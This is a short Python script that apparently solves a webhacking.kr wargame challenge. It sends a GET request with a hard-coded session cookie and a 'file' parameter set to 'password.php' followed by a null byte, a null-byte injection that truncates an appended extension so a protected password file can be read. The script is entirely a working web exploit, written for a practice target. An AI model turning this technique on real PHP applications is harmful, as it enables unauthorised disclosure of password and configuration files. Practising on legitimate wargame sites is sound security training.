import requests

url = "http://webhacking.kr/challenge/bonus/bonus-5/"

headers = {
	"Cookie":"PHPSESSID=b2f4afe01ffbb827e31f86bff992b61d",
	"Host":"webhacking.kr"
}

params = {
	"file":"password.php\x00"
}

req = requests.get(url, headers=headers, params=params)
print repr(req.content)